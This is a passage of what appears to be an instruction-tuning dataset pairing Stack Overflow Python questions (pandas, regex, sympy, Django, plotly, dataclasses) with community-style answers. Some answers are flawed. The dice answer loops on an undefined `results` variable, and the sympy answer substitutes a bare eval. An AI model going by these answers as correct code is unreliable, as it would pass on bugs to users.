NE57 auto', 'ScURFA 42342']\n<\/code><\/pre>","output_text":"<p>You can do it exactly the same as your other regex:<\/p>\n<pre><code>regular_expression = rf&quot;({'|'.join(brand_list)}) *({'|'.join(model_list)})?&quot;\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>['SEIKO 44-9990 Gold Medallion', 'Seiko NE57 auto', 'ScURFA 42342']\n<\/code><\/pre>\n<p>The <code> *<\/code> in the regex between the two list joins means, that it matches both, with space or without.<\/p>\n<h1>EDIT:<\/h1>\n<p>Full code I have used to test:<\/p>\n<pre><code>import re\n\nbrand_list = ['scurfa', 'seagull', 'seagull', 'seiko']\nmodel_list = ['44-9990 Gold Medallion', 'NE57 auto', '42342']\n\nregular_expression = rf&quot;({'|'.join(brand_list)}) *({'|'.join(model_list)})?&quot;\n\ndescription = &quot;&quot;&quot;\nVINTAGE KING SEIKO 44-9990 Gold Medallion,Manual Winding with mod caseback.Serviced 2019.\nPower reserve function at 12; push-pull crown at 4\nSeiko NE57 auto movement with power reserve\nMultilayered dial with SuperLuminova BG-W9\nTesting for a ScURFA 42342\n&quot;&quot;&quot;\n\nprint([&quot; &quot;.join(t) for t in re.findall(regular_expression, description, re.IGNORECASE)])\n<\/code><\/pre>\n<h1>EDIT 2:<\/h1>\n<p>Added trailing question mark for optional model regex.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Detect specific characters in pandas dataframe<p>How to detect columns and rows that might have one of the characters in a string of a dataframe element other than the desired characters.<\/p>\n<p>desired characters are A, B, C, a, b, c, 1, 2, 3, &amp;, %, =, \/<\/p>\n<p>dataframe -<\/p>\n<div class=\"s-table-container\">\n<table class=\"s-table\">\n<thead>\n<tr>\n<th>Col1<\/th>\n<th>Col2<\/th>\n<th>Col3<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td>Abc<\/td>\n<td>\u00d8a<\/td>\n<td>12<\/td>\n<\/tr>\n<tr>\n<td>bbb<\/td>\n<td>+<\/td>\n<td>}<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<\/div>\n<p>output will be elements \u00d8a, +, } and their location in dataframe.<\/p>","output_text":"<p>I find it really difficult to locate an element for a condition directly in pandas, so I converted the dataframe to a nested list first, then proceeded to work with the list. Try this:<\/p>\n<pre><code>import pandas as pd\nimport numpy as np\n\n#creating your sample dataframe\narray = np.array([['Abc','\u00d8a','12'],['bbb','+','}']]) \ncolumns = ['Col1','Col2','Col3']\ndf = pd.DataFrame(data=array, columns=columns)\n\n#convert dataframe to nested list\npd_list = df.values.tolist() \n\n#return any characters other than the ones in 'var'\nall_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\\'()*+,-.\/:;=&gt;?@[\\\\]^_`{|}~\u00d8'\nvar = 'ABCabc123&amp;%=\/\/' \nfor a in var:\n    all_chars = all_chars.replace(a, &quot;&quot;)\n\n#stores previously detected elements to prevent duplicate\ntemp_storage = []\n\n#loops through the nested list to get the elements' indexes\nfor x in all_chars:\n    for i in pd_list:\n        for n in i:\n            if x in n:\n                #check if element is duplicate\n                if not n in temp_storage: \n                    temp_storage.append(n)\n                    print(f'found {n}: row={pd_list.index(i)}; col={i.index(n)}')\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>&gt; found +: row=1; col=1     \n&gt; found }: row=1; col=2\n&gt; found \u00d8a: row=0; col=1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n I can't get abs(a) if I use sqrt(parse_expr('a**2')).simplify(). Python outputs sqrt(a**2). The sympy library<p>This code gives sqrt(a^2), I need it to give abs(a).<\/p>\n<pre><code>from sympy import sqrt, simplify, symbols\nfrom sympy.parsing.sympy_parser import parse_expr\na = symbols('a', real=True)\nexpr = parse_expr('a**2')\nsqrt(simplify(expr)).simplify()\n<\/code><\/pre>","output_text":"<pre class=\"lang-py prettyprint-override\"><code>from sympy import sqrt, simplify, symbols\na = symbols('a', real=True)\nexpr = eval('a**2')\nsqrt(simplify(expr)).simplify()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Get absolute path of current .py file in docker container<p>Im trying to get the absolute path of a .py file to access an other file which is located in the same directory (<code>\/files<\/code>). All files are mounted in a docker container as part of a jenkins pipeline. In the .py file I use the following syntax to get the absolute path:<\/p>\n<pre><code>    from pathlib import Path\n\n    current_dir = f&quot;{Path(__file__).resolve().parent}\/result.txt&quot;\n<\/code><\/pre>\n<p>The file exists in the container but im receiving the following error:<\/p>\n<pre><code>No such file or directory: '\/tmp\/.tmpAA7qY3\/files\/result.txt'\n<\/code><\/pre>\n<p>The Jenkins file looks like this:<\/p>\n<pre><code>node('docker') {\n    docker.image(&quot;circleci\/python:3.7-buster&quot;).inside('--user root:root'+' -v \/var\/run\/docker.sock:\/var\/run\/docker.sock') {\n        stage(&quot;Scan dependencies&quot;) {\n            checkout scm\n            sh 'poetry run pytest'\n        }\n    }\n}\n<\/code><\/pre>","output_text":"<p><code>Jenkins<\/code> will create a new temporary folder which is called <code>workspace<\/code> for each specific build instance. Therefore your code is really in <code>\/tmp\/.tmpAA7qY3<\/code>. Since you are running in the tmp folder, it's not strange that the <code>__file__<\/code> will resolve to that path.<\/p>\n<p>You need to find out where exactly the file you are searching will be located relative to your temporary folder, or as an absolute path. If you are not in control of how the file was created, easiest is to execute the <code>find \/ -name result.txt<\/code> and get the result.<\/p>\n<p>If the file is created in another stage in the <code>Jenkins<\/code> pipeline flow, the file might not be in the container since each stage can create it's own container as explained <a href=\"https:\/\/www.jenkins.io\/doc\/book\/pipeline\/docker\/\" rel=\"nofollow noreferrer\">here<\/a>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Understanding tensorflow keras LSTM when activation='softmax'<p>My understanding of the <code>activation<\/code> kwarg in <code>tf.keras.layers.LSTM<\/code> is the same as for any other layer (eg. <code>Dense<\/code>). But the following toy example will break.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from tensorflow.keras import Sequential\nfrom tensorflow.keras.layers import LSTM\nfrom numpy.random import uniform\n\nm = Sequential([\n    LSTM(5, activation='softmax')\n])\n\nm.compile(\n    optimizer='adam',\n    loss='sparse_categorical_crossentropy'\n)\n\nx = uniform(size=(10, 5, 3))\ny_pred = m.predict(x)\nassert all(y_pred.sum(axis=1) == 1), 'Predictions are not a valid categorical distribution'\n<\/code><\/pre>\n<p>This will fail. <code>y_pred.sum(axis=1)<\/code> will be a vector of random floats between 0 and 1 that do not sum to 1. Eg:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>[0.5083836, 0.50286007, 0.504391, 0.5309103, 0.5131448, 0.53934443, 0.5301699, 0.49676484, 0.51985925, 0.5021868]\n<\/code><\/pre>\n<p>It seems that LSTM does not apply a valid softmax here. Is this by design and I'm just not understanding the fundamentals of <code>LSTMCell<\/code>?<\/p>\n<p>Of course, I can achieve a proper softmax distribution by appending <code>tf.keras.layers.Softmax()<\/code> but I'm curious why this should be necessary.<\/p>","output_text":"<p>It doesn't sum to one because the activation here is directly apply on each hidden unit, as @joelthchao said on <a href=\"https:\/\/github.com\/keras-team\/keras\/issues\/6255\" rel=\"nofollow noreferrer\">GitHub<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Setting specific bin length in python list<p>I have a straightforward question but I'm facing issues for conversion. <\/p>\n\n<p>I have a pandas dataframe column which I converted to a list. It has both positive and negative values:<\/p>\n\n<p>bin_length = 5<\/p>\n\n<p>list = [-200, -112, -115, 0, 50, 120, 250] <\/p>\n\n<p>I need to group these numbers into a bin of length 5. <\/p>\n\n<p>For example: <\/p>\n\n<p>-100 to -95 should have a value of -100<\/p>\n\n<p>-95 to -90 should have a value of -95<\/p>\n\n<p>Similarly for positive values:<\/p>\n\n<p>0 to 5 should be 5<\/p>\n\n<p>5 to 10 should be 10<\/p>\n\n<p>What I have tried until now:<\/p>\n\n<pre><code>df = pd.DataFrame(dataframe['rd2'].values.tolist(), columns = ['values'])\nbins = np.arange(0, df['values'].max() + 5, 5)\ndf['bins'] = pd.cut(df['values'], bins, include_lowest = True)\n<\/code><\/pre>\n\n<p>But this doesn't account for negative values and then I get problems in converting the pandas interval into a separate columns for list. <\/p>\n\n<p>Any help would be amazing.<\/p>","output_text":"<p>Setting up the correct lower limit with <code>np.arange<\/code>:<\/p>\n\n<pre><code>bins = np.arange(df[\"values\"].min(), df['values'].max() + 5, 5)\ndf['bins'] = pd.cut(df['values'], bins, include_lowest = True)\n\nprint (df)\n\n   values                bins\n0    -200  (-200.001, -195.0]\n1    -112    (-115.0, -110.0]\n2    -115    (-120.0, -115.0]\n3       0         (-5.0, 0.0]\n4      50        (45.0, 50.0]\n5     120      (115.0, 120.0]\n6     250      (245.0, 250.0]\n<\/code><\/pre>\n\n<p>Convert the intervals back to a list:<\/p>\n\n<pre><code>s = pd.IntervalIndex(df[\"bins\"])\n\nprint ([[x,y] for x,y in zip(s.left, s.right)])\n\n[[-200.001, -195.0], [-115.0, -110.0], [-120.0, -115.0], [-5.0, 0.0], [45.0, 50.0], [115.0, 120.0], [245.0, 250.0]]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Change hinted type of inherited member<p>Say I have a type-hinted member of a class, and when I inherit I want to change the hinted type of that member to an inherited type.  Is that possible?<\/p>\n\n<pre><code>class Animal:\n    pass\n\nclass Dog(Animal):\n    def look_for_bone(self):\n        print(\"Found a bone.\")\n\nclass Home:\n    def __init__(self, occupant: Animal):\n        self.occupant: Animal = occupant\n\nclass Kenel(Home):\n    def __init__(self, occupant: Dog):\n        super(Kenel, self).__init__(occupant)\n\n        # Here I KNOW that the occupant isn't just an Animal, it's a Dog.\n        self.occupant: Dog\n        # I've also tried `assert isinstance(self.occupant, Dog)`\n        # and `assert isinstance(occupant, Dog)`.\n\nfenton = Dog()\nk = Kenel(fenton)\nprint(type(k.occupant))\n# I want my IDE to be able to tab-complete look_for_bone on k.occupant\nk.occupant.look_for_bone()\n<\/code><\/pre>\n\n<p>The above code generates an IDE (PyCharm) warning on <code>k.occupant.look_for_bone()<\/code>: \"Unresolved attribute reference \"look_for_bone\" for class Animal\".  But it runs fine:<\/p>\n\n<pre><code>&lt;class '__main__.Dog'&gt;\nFound a bone.\n<\/code><\/pre>","output_text":"<p>Even though <a href=\"https:\/\/www.python.org\/dev\/peps\/pep-0526\/#class-and-instance-variable-annotations\" rel=\"nofollow noreferrer\">PEP 526<\/a> explicitly mentions that annotating instance variables in <code>__init__<\/code> is allowed this doesn't seem to work in PyCharm. It runs fine with mypy 0.761 though. So I suppose this is a PyCharm specific problem.<\/p>\n\n<p>Besides annotations in <code>__init__<\/code> one can also annotate instance variable in the class body itself (see again <a href=\"https:\/\/www.python.org\/dev\/peps\/pep-0526\/#class-and-instance-variable-annotations\" rel=\"nofollow noreferrer\">PEP 526<\/a>). This does work with PyCharm. So in order to fix your problem you can use:<\/p>\n\n<pre><code>class Kenel(Home):\n    occupant: Dog\n\n    def __init__(self, occupant: Dog):\n        super().__init__(occupant)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n check if one dataframe values match another dataframe column then set value in dataframe column<p>I have a dataframe dfScore<\/p>\n<pre><code>dfScore = pd.DataFrame([[&quot;ringo&quot;, 0,0,0]], columns=[&quot;Name&quot;,&quot;Sales total&quot;,&quot;Problem total&quot;,&quot;Finance total&quot;])\n\n    Name  Sales total  Problem total  Finance total\n0  ringo            0              0              0\n<\/code><\/pre>\n<p>and a dataframe categories<\/p>\n<pre><code>data = [[&quot;Finance total&quot;, 14], [&quot;Sales total&quot;, 4], [&quot;Problem total&quot;, 5]] \ncategories = pd.DataFrame(data, columns = ['Category', 'ScoreTruth'])\n\n        Category  ScoreTruth\n0  Finance total          14\n1    Sales total           4\n2  Problem total           5\n<\/code><\/pre>\n<p>What I would like to do is check whether a value from &quot;Category&quot; in categories is contained in the columns of dfScores. If yes then set the value in dfScores column to &quot;ScoreTruth&quot; adjacent value. I've tried using isin to get the indices in dfScores column but that doesn't actually tell me which Category is which index. i.e.<\/p>\n<pre><code>index = np.where(dfScore.columns.isin(categories[&quot;Category&quot;]))\nprint(index[0])\n&gt;&gt;&gt;[1 2 3]\n<\/code><\/pre>\n<p>If I try to get the index from isin the other way around I get<\/p>\n<pre><code>index2 = np.where(categories[&quot;Category&quot;].isin(dfScore.columns))\nprint(index2[0])\n&gt;&gt;&gt;[0 1 2]\n<\/code><\/pre>\n<p>So now I thought I could do something like this <code>dfScore.iloc[:,index[0]] = categories.iloc[index2[0]].loc[&quot;ScoreTruth&quot;]<\/code> to set the values but I get <code>KeyError: 'ScoreTruth'<\/code> Obviously this would only work if I set every row in dfScores using the index[0] anyway which is not ideal.<\/p>\n<p>I would like to output a dataframe that looks like this<\/p>\n<pre><code>    Name  Sales total  Problem total  Finance total\n0  ringo            4              5             14\n<\/code><\/pre>","output_text":"<p>Let's try <code>DataFrame.assign<\/code>:<\/p>\n<pre><code>s = categories.set_index('Category')['ScoreTruth']\ndfScore.assign(**s[s.index.intersection(dfScore.columns)])\n<\/code><\/pre>\n<hr \/>\n<pre><code>    Name  Sales total  Problem total  Finance total\n0  ringo            4              5             14\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django - How to declare variable in template depending on condition<p>I'm looking to do something really basic but against all odds it seems like it's not as easy as it should be.<\/p>\n<p>I need to transcribe the following into django template syntax :<\/p>\n<pre><code>p = '&amp;' if '?' in request.path else '?'\n<\/code><\/pre>\n<p>All I found so far to create variable is the <strong>with<\/strong> statement but I can't get what I need :<\/p>\n<pre><code>{% if '?' in request.path %}\n    {% with p='&amp;' %}{% endwith %}\n{% else %}\n    {% with p='?' %}{% endwith %}\n{% endif %}\n<\/code><\/pre>\n<p>p needs to be available in all the template, and since I use a condition here, I can't afford to duplicate the html structure twice to put it inside the with statement.<\/p>\n<p>It has to be an easy way to do this that I'm missing...<\/p>","output_text":"<p>No one knows so I created a custom tag in my app to perform something that should be straight forward... :<\/p>\n<pre><code>@register.simple_tag\ndef define(val=None):\n    return val\n<\/code><\/pre>\n<p>And in my view :<\/p>\n<pre><code>{% load custom_tags %}\n    {% if '?' in new_partial_url %}\n      {% define &quot;&amp;&quot; as p %}\n    {% else %} \n      {% define &quot;?&quot; as p %}\n    {% endif %}\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How do I refer to an element in a nested list within a for-loop?<p>I have a nested list of coordinates <code>[[x1, y1],[x2, y2],[x3,y3]...]<\/code>.<\/p>\n<p>I want to use a <code>for-loop<\/code> in order to determine the distance in the x-direction between two consecutive points. I want to do the same thing for the y-direction later. This is my attempt so far:<\/p>\n<pre><code>p1=[X1, Y1]\np2=[X2, Y2]\np3=[X3, Y3]\np4=[X4, Y4]\np5=[X5, Y5]\ncoordiantes = [p1, p2, p3, p4, p5]\n    \nfor i in coordinates:\n            p1_x = i[0]\n            p2_x = i[0]+1\n            p1_y = i[1]\n            p2_y = i[1]+1\n            distance_x = p2_x - p1_x\n<\/code><\/pre>\n<p>Apparently, <code>i[0]+1<\/code> doesn't give you the subsequent x-value in the next list but adds <code>1<\/code> to the first x-value.<\/p>\n<p>My question is how do I refer to the subsequent x-value in my nested list? So, if <code>i<\/code> referred to <code>p1<\/code>, I also want to get <code>p2<\/code> in that loop.<\/p>\n<p>I also tried adding another variable <code>j<\/code> and assigning it <code>j = i + 1<\/code> so that I can refer to the subsequent x-value by using j[0]. However, I get the error that one cannot concatenate list to int.<\/p>\n<p>Thank you in advance!<\/p>","output_text":"<p><code>for i in coordinates<\/code> is a for-each loop. You don't have access to the current index, <code>i<\/code> is directly the list child.<\/p>\n<p>You should loop using <code>range<\/code> or <code>enumerate<\/code> if you want to access the adjacent item by incrementing current index. For example,<\/p>\n<pre><code>for ind in range(len(coordinates)-1):\n            p1_x = coordinates[ind][0]\n            p2_x = coordinates[ind+1][0]\n            p1_y = coordinates[ind][1]\n            p2_y = coordinates[ind+1][1]\n            distance_x = p2_x - p1_x\n<\/code><\/pre>\n<p>The range limit is len-1 because we don't want to process the last element (ind+1 would be out of bounds).<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to convert .wav file into an image for neural network?<p>I am trying to perform sound classification using neural network and would like to convert the audio file of 4 seconds in .wav file format to be converted to an image.<\/p>\n<p>I would prefer to use Librosa library. Also I would like to know how to read this image and provide it as an input to any CNN model.<\/p>\n<p>I did find similar post here but they don't solve my issue.<\/p>\n<p>This is what I have tried so far:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>y, sr = librosa.load('36902-3-2-0.wav')\nS = librosa.feature.melspectrogram(y, sr, n_mels=128, fmax=8000)\nlibrosa.display.specshow(librosa.power_to_db(S, ref=np.max), fmax=8000)\nplt.savefig('mel.png')\n<\/code><\/pre>\n<p>I get this image:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/CN75e.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/CN75e.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>And when I try to read the image using <code>matplotlib.pyplot<\/code> or <code>cv2<\/code>, all I get is an array filled with <code>255<\/code> value:<\/p>\n<pre class=\"lang-sh prettyprint-override\"><code>array([[[255, 255, 255],\n        [255, 255, 255],\n        [255, 255, 255],\n        ...,\n        [255, 255, 255],\n        [255, 255, 255],\n        [255, 255, 255]],\n\n       [[255, 255, 255],\n        [255, 255, 255],\n        [255, 255, 255],\n        ...,\n        [255, 255, 255],\n        [255, 255, 255],\n        [255, 255, 255]],\n\n       [[255, 255, 255],\n        [255, 255, 255],\n        [255, 255, 255],\n        ...,\n        [255, 255, 255],\n        [255, 255, 255],\n        [255, 255, 255]],\n\n       ...,\n<\/code><\/pre>\n<p>Link to audio file: <a href=\"https:\/\/drive.google.com\/file\/d\/1BBgOxKy2-JMOHa90DCeFVLgoA7pEblVg\/view?usp=sharing\" rel=\"nofollow noreferrer\">https:\/\/drive.google.com\/file\/d\/1BBgOxKy2-JMOHa90DCeFVLgoA7pEblVg\/view?usp=sharing<\/a><\/p>","output_text":"<p>That's perfectly normal - you are looking at the white border around the sides and <code>(255,255,255)<\/code> is white.<\/p>\n<p>Try looking around coordinates <code>200,200<\/code>:<\/p>\n<pre><code>print(array[200:210, 200:210])\n\narray([[[ 96,  87, 235],\n        [ 96,  87, 235],\n        [ 96,  87, 235],\n        [ 95,  90, 237],\n        [ 95,  90, 237],\n        ...\n        ...\n<\/code><\/pre>\n<p>Or look at the mean:<\/p>\n<pre><code>print(array.mean())\n\n161.20984439300412\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n My code appends the same list 10 times instead of appending 10 randomized lists?<p>At the moment, the while loop creates one list and appends it 10 times to the results list.<\/p>\n<p>What do I need to change in the <code>def dice()<\/code> so that the while loop creates 10 different lists and appends them to the results list?<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from random import choice\n\nlist = [1, 2, 3, 4, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]\nwinner = []\nticket = [1, 2]\nresults = []\nclass Die: \n    def __init__(self, a_list):\n        self.a_list = a_list\n    \n    def dice(self):\n        while len(results) &lt; 10:\n            results.append(winner)\n            while len(winner) &lt; 2:\n                die = choice(self.a_list)\n                winner.append(die)\n        print(results)\n            \n\n        \n\nmy_dice = Die(list)\n\nmy_dice.dice()\n<\/code><\/pre>","output_text":"<p>I wrote a different approach using <code>zip<\/code>, if this works for you:<\/p>\n<pre><code>import random\n\nlis = [1, 2, 3, 4, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]\ncombo_1 = []\nticket = [1, 2]\ncombo_2 = []\n\nclass Die: \n    def __init__(self, a_list):\n        self.a_list = a_list\n    \n    def dice(self):\n        while len(results) &lt; 10:\n            combo_2.append(random.choice(self.a_list))\n            combo_1.append(random.choice(self.a_list))\n        dice = [list(i) for i in zip(combo_1, combo_2)]\n            \n        print(dice)\n            \n\nmy_dice = Die(lis)\n\nmy_dice.dice()\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>[['b', 'd'], [3, 'b'], ['c', 'b'], ['d', 2], ['a', 4], ['d', 2], ['c', 'c'], ['b', 'b'], [3, 'b'], [3, 3]]\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python dataclass and date issue<p>I have this data class in python.<\/p>\n<pre><code>from dataclasses import dataclass\nfrom dataclasses_json import dataclass_json\n\n    @dataclass                                 \n    @dataclass_json                            \n    class Test:                                \n        published_date: datetime = &quot;&quot; \n        version: str = &quot;&quot;     \n             \n<\/code><\/pre>\n<p>And this dictionary<\/p>\n<pre><code>row                                        \n{'published_date': '', 'version': 'ver 6'} \n<\/code><\/pre>\n<p>When i try to create the data class from the dictionary i get an error.<\/p>\n<pre><code>Test.from_dict(row)\n    218     else:                                                    \n    219         tz = datetime.now(timezone.utc).astimezone().tzinfo  \n--&gt; 220         res = datetime.fromtimestamp(field_value, tz=tz)     \n    221 elif _issubclass_safe(field_type, Decimal):                  \n    222     res = (field_value                                       \n    223            if isinstance(field_value, Decimal)               \n    224            else Decimal(field_value))                        \n                                                                     \nTypeError: 'str' object cannot be interpreted as an integer \n\n     \n<\/code><\/pre>\n<p>I want only the date portion of the string and not the time.\nWhy am i getting this error ?<\/p>\n<p>I changed the  decorator order and surprisingly it works now.<\/p>\n<pre><code> @dataclass_json                                                 \n @dataclass                                                      \n class Test:                                                     \n     published_date: datetime.date = &quot;&quot;                          \n     version: str = &quot;&quot;                                           \n                                                                 \n                                                                 \nrow = {&quot;published_date&quot;: &quot;&quot;, &quot;version&quot;: &quot;&quot;}                      \n                                                                 \nTest.from_dict(row)                                              \nTest(published_date='', version='')                              \n                                                                 \nrow = {&quot;published_date&quot;: &quot;2022-05-17&quot;, &quot;version&quot;: &quot;&quot;}            \n                                                                 \nTest.from_dict(row)                                              \nTest(published_date='2022-05-17', version='')  \n\n              \n<\/code><\/pre>","output_text":"<p>Another option you could look into, assuming that you don't need to work with <code>marshmallow<\/code> schemas, would be the <a href=\"https:\/\/dataclass-wizard.readthedocs.io\/\" rel=\"nofollow noreferrer\">dataclass-wizard<\/a>. It should overall be slightly faster - I added a quick comparison i put together below.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from __future__ import annotations  # can be removed in Python 3.10+\n\nimport datetime\nfrom dataclasses import dataclass\nfrom timeit import timeit\n\nfrom dataclass_wizard import JSONWizard\nfrom dataclasses_json import dataclass_json\n\n\n@dataclass_json\n@dataclass\nclass Test:\n    published_date: datetime.date = ''\n    version: str = ''\n\n\n@dataclass\nclass TestWiz(JSONWizard):\n    published_date: datetime.date | str = ''\n    version: str = ''\n\n\nn = 1_000\n\nrow1 = {&quot;published_date&quot;: &quot;&quot;, &quot;version&quot;: &quot;&quot;}\nrow2 = {&quot;published_date&quot;: &quot;2022-05-17&quot;, &quot;version&quot;: &quot;&quot;}\n\ntj = timeit('Test.from_dict(row1)', number=n, globals=globals())\ntw = timeit('TestWiz.from_dict(row1)', number=n, globals=globals())\n\nprint(f'dataclasses-json:  {tj:.3f}')  # 0.024\nprint(f'dataclass-wizard:  {tw:.3f}')  # 0.001\n\n# assert data is the same\nassert Test.from_dict(row2).__dict__ == TestWiz.from_dict(row2).__dict__\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Using a list for x and y axis in plotly<p>I have a Python list that I want to use to chart a line chart in Plotly.\nThe list contains accidents in each week of the year. So for instance list[5]=12 would indicate that in week 5 of 2020, there were 12 accidents.\nI want to draw a line chart showing the trend of accidents in 2020.<\/p>\n<p>The full list split into two lists is as follows:<\/p>\n<pre><code>x axis [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53]\ny axis [0, 0, 0, 2, 3, 4, 2, 3, 2, 2, 6, 4, 2, 1, 2, 1, 1, 3, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 3, 0, 0, 0, 2, 0, 0, 3, 0, 2, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0]\n<\/code><\/pre>\n<p>If I enumerate the single list it is as follows:<\/p>\n<pre><code>for e,i in enumerate(my_list):\n    print(f&quot;e-&gt;{e}, i-&gt;{i}&quot;)\n    e-&gt;0, i-&gt;0\n    e-&gt;1, i-&gt;0\n    e-&gt;2, i-&gt;0\n    e-&gt;3, i-&gt;2\n    e-&gt;4, i-&gt;3\n    e-&gt;5, i-&gt;4\n    e-&gt;6, i-&gt;2\n    e-&gt;7, i-&gt;3\n    e-&gt;8, i-&gt;2\n    e-&gt;9, i-&gt;2\n    e-&gt;10, i-&gt;6\n    e-&gt;11, i-&gt;4\n    e-&gt;12, i-&gt;2\n    e-&gt;13, i-&gt;1\n    e-&gt;14, i-&gt;2\n    e-&gt;15, i-&gt;1\n    e-&gt;16, i-&gt;1\n    e-&gt;17, i-&gt;3\n    e-&gt;18, i-&gt;1\n    e-&gt;19, i-&gt;0\n    e-&gt;20, i-&gt;0\n    e-&gt;21, i-&gt;0\n    e-&gt;22, i-&gt;0\n    e-&gt;23, i-&gt;0\n    e-&gt;24, i-&gt;0\n    e-&gt;25, i-&gt;0\n    e-&gt;26, i-&gt;0\n    e-&gt;27, i-&gt;0\n    e-&gt;28, i-&gt;0\n    e-&gt;29, i-&gt;0\n    e-&gt;30, i-&gt;0\n    e-&gt;31, i-&gt;0\n    e-&gt;32, i-&gt;0\n    e-&gt;33, i-&gt;0\n    e-&gt;34, i-&gt;0\n    e-&gt;35, i-&gt;0\n    e-&gt;36, i-&gt;0\n    e-&gt;37, i-&gt;0\n    e-&gt;38, i-&gt;0\n    e-&gt;39, i-&gt;0\n    e-&gt;40, i-&gt;0\n    e-&gt;41, i-&gt;0\n    e-&gt;42, i-&gt;0\n    e-&gt;43, i-&gt;0\n    e-&gt;44, i-&gt;0\n    e-&gt;45, i-&gt;0\n    e-&gt;46, i-&gt;0\n    e-&gt;47, i-&gt;0\n    e-&gt;48, i-&gt;0\n    e-&gt;49, i-&gt;0\n    e-&gt;50, i-&gt;0\n    e-&gt;51, i-&gt;0\n    e-&gt;52, i-&gt;0\n    e-&gt;53, i-&gt;0\n<\/code><\/pre>\n<p>The index of the list will be X axis and the value will be the Y axis.\nNormally what I do is use two lists as follows:<\/p>\n<pre><code># load the x and y axis\nmy_figure = px.line(x=x_list, y=y_list, title=&quot;Testing&quot;)\n                       \n\n# now draw the line chart\ndcc.Graph(id='my_figure', figure=my_figure),\n<\/code><\/pre>\n<p>However, in this case I only have one list, and I want to avoid copying the index value into a 2nd list. How can I use the single list with Plotly to draw a line chart?<\/p>","output_text":"<p>You can create a dataframe and then try plotting with that dataframe<\/p>\n<pre><code>df = pd.DataFrame({'x_data':x_list, 'y_data':y_list})\n\npx.line(df, x='x_data', y='y_data', title=&quot;Testing&quot;)\n<\/code><\/pre>\n<p><code>px.line(df, y='y_data', title=&quot;Testing&quot;)<\/code> also works in this case<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Pandas join rows of text and output as a new variable<p>Given following DF<\/p>\n<pre><code>    0\n0   Maintain the distance.\n1   Ensure it is checked.\n2   Inbetween distance must be 0.5.\n3   Take extra notes of the distance.\n<\/code><\/pre>\n<p>Is it possible for Pandas to join all rows, give a new line and return the result as a variable?<\/p>\n<p>Final output:<\/p>\n<p>Variable <code>n<\/code>:<\/p>\n<pre><code>Maintain the distance.\n\nEnsure it is checked.\n\nInbetween distance must be 0.5.\n\nTake extra notes of the distance.\n<\/code><\/pre>\n<p>I have explored <code>str.cat()<\/code> but seem like the separator do not allow a <code>\\n<\/code>.<\/p>","output_text":"<p>Use as many <code>\\n<\/code> newlines as you like.<\/p>\n<pre><code>&gt;&gt;&gt; df = pd.DataFrame(dict(word='a man a plan a canal'.split()))\n&gt;&gt;&gt; df\n    word\n0      a\n1    man\n2      a\n3   plan\n4      a\n5  canal\n&gt;&gt;&gt; \n&gt;&gt;&gt; text = df.word.str.cat(sep='\\n\\n')\n&gt;&gt;&gt; print(text)\na\n\nman\n\na\n\nplan\n\na\n\ncanal\n<\/code><\/pre>"}
